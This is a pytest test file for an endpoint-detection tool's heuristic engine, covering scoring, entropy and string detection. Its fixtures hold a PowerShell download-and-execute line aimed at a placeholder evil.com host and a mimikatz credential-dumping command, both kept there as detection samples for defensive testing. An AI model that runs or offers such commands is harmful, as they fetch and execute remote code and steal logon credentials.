"""Tests for the heuristic analysis engine."""

from __future__ import annotations

from pathlib import Path

import pytest

from edr.engine.heuristics import (
    HeuristicResult,
    analyze,
    analyze_strings,
    _entropy,
)


class TestHeuristicResult:
    def test_default_is_clean(self):
        r = HeuristicResult()
        assert r.score == 0
        assert r.verdict == "clean"
        assert r.flags == []

    def test_add_flag_updates_score(self):
        r = HeuristicResult()
        r.add_flag("Test flag", 30)
        assert r.score == 30
        assert "Test flag" in r.flags

    def test_verdict_suspicious_at_50(self):
        r = HeuristicResult()
        r.add_flag("a", 50)
        assert r.verdict == "suspicious"

    def test_verdict_malicious_at_80(self):
        r = HeuristicResult()
        r.add_flag("a", 80)
        assert r.verdict == "malicious"

    def test_score_capped_at_100(self):
        r = HeuristicResult()
        r.add_flag("a", 60)
        r.add_flag("b", 60)
        assert r.score == 100

    def test_merge_combines_flags_and_score(self):
        r1 = HeuristicResult()
        r1.add_flag("flag1", 20)
        r2 = HeuristicResult()
        r2.add_flag("flag2", 25)
        r1.merge(r2)
        assert r1.score == 45
        assert "flag1" in r1.flags
        assert "flag2" in r1.flags


class TestEntropy:
    def test_zero_entropy_uniform(self):
        data = b"\x00" * 1000
        assert _entropy(data) == 0.0

    def test_high_entropy_random(self):
        import os
        data = os.urandom(10000)
        assert _entropy(data) > 7.0

    def test_empty_data(self):
        assert _entropy(b"") == 0.0


class TestAnalyzeStrings:
    def test_clean_file_low_score(self, clean_file):
        result = analyze_strings(clean_file)
        assert result.score < 50

    def test_encoded_powershell_detected(self, suspicious_script):
        result = analyze_strings(suspicious_script)
        assert result.score > 0
        assert any("EncodedCommand" in f or "Encoded" in f for f in result.flags)

    def test_double_extension_detected(self, double_ext_file):
        # Write the double-ext pattern into file content
        double_ext_file.write_bytes(b"file.pdf.exe content here")
        result = analyze_strings(double_ext_file)
        assert any("extension" in f.lower() for f in result.flags)

    def test_invoke_expression_detected(self, tmp_path):
        p = tmp_path / "test.ps1"
        p.write_bytes(b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com')")
        result = analyze_strings(p)
        assert result.score > 0

    def test_mimikatz_strings_high_score(self, tmp_path):
        p = tmp_path / "dump.exe"
        p.write_bytes(b"mimikatz sekurlsa::logonpasswords")
        result = analyze_strings(p)
        assert result.score >= 8   # mimikatz + sekurlsa each score 8

    def test_missing_file_returns_clean(self, tmp_path):
        result = analyze_strings(tmp_path / "ghost.bin")
        assert result.score == 0


class TestAnalyze:
    def test_clean_file_is_clean(self, clean_file):
        result = analyze(clean_file)
        assert result.verdict == "clean"

    def test_suspicious_script_flagged(self, suspicious_script):
        result = analyze(suspicious_script)
        assert result.score > 0

    def test_analyze_returns_heuristic_result(self, clean_file):
        result = analyze(clean_file)
        assert isinstance(result, HeuristicResult)
